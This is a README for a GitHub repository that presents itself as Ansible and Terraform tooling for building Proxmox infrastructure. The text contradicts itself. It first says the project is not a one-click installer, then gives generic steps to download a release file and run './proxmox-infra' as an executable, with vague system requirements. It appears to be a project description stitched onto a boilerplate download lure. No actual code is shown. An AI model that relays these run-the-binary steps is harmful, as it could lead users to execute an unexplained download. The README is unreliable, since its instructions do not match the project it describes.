# 🚀 proxmox-infra - Build Proxmox Infrastructure with Ease

[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/01webflow/proxmox-infra/releases)

## 🗒️ Overview

This repository provides a complete, opinionated, and safe way to build and operate Proxmox-based infrastructure from absolute zero. The aim is to help users create and manage their Proxmox setup clearly and explicitly, avoiding confusion and guesswork.

## 🤖 Features

- **Ansible** for host and VM configuration
- **Terraform** for VM lifecycle management
- **cloud-init** for initial VM access
- **GitHub Actions** for basic quality checks

No magic. No shortcuts. Everything is explicit and auditable.

## 🎯 Who This Is For

This repository is for those who want to:

- Rebuild a Proxmox host without guessing what was done last time
- Create VMs repeatedly in a predictable way
- Avoid storage-related problems
- Stop doing infrastructure by memory
- Understand exactly what happens first, second, and last

This is not beginner material, but it assumes zero prior state.

## ❌ What This Repository Is NOT

- Not a tutorial series
- Not a one-click installer
- Not a demo
- Not opinion-free

You are expected to:

- Read instructions
- Run commands intentionally
- Understand that infrastructure changes require thought and attention

## 📦 Download & Install

To download and run the software, visit the following link:

[Download the latest release](https://github.com/01webflow/proxmox-infra/releases)

### 🛠️ System Requirements

- **Operating System:** Compatible with any modern Linux distribution.
- **Proxmox Version:** Ensure you are running a supported version of Proxmox.
- **RAM:** At least 8GB of RAM recommended.
- **Disk Space:** Minimum 20GB free disk space.

### 📥 Steps to Download

1. Click the link above to access the Releases page.
2. Look for the latest release at the top of the page.
3. Click on the appropriate file for your operating system.
4. Follow the prompts in your browser to download.

### ⚙️ How to Run

1. Once the download completes, locate the file on your computer.
2. Open your terminal or command prompt.
3. Navigate to the directory where you saved the file.
4. Execute the command to run the software.

For example:
```bash
./proxmox-infra
```

## 📋 Usage Instructions

After successfully running the application, you'll go through a structured process to set up your Proxmox infrastructure. Here is a rough sequence of what to expect:

1. **Configuration**: You will configure your Proxmox host and virtual machines using Ansible.
2. **Lifecycle Management**: Utilize Terraform to manage the lifecycle of your VMs effortlessly.
3. **Initial Access**: Use cloud-init for your initial access to VMs.
4. **Quality Checks**: Rely on GitHub Actions to verify your setup.

Make sure to read any prompts and follow the instructions carefully to achieve your desired setup.

## ⚠️ Troubleshooting

If you encounter issues:

- Revisit each step to ensure all commands were run correctly.
- Check the GitHub issues page to see if others had similar problems.
- Ensure your system meets the requirements listed above.

## 🛠️ Community Support

For further support or to share your experiences, use the issues section on [GitHub](https://github.com/01webflow/proxmox-infra/issues). Engaging with the community can provide additional insights and solutions.

## 🔄 Updates

Stay updated with the latest releases by frequently checking the Releases page. Here’s the link again for easy access:

[Download the latest release](https://github.com/01webflow/proxmox-infra/releases)

Github releases will include updates, new features, and bug fixes. Regularly updating ensures you have the most stable experience.

## 📝 Acknowledgments

Thanks to all contributors who have made this repository better. Your efforts help others build and manage their Proxmox infrastructures more effectively.

Stay organized, avoid confusion, and build with clarity using proxmox-infra.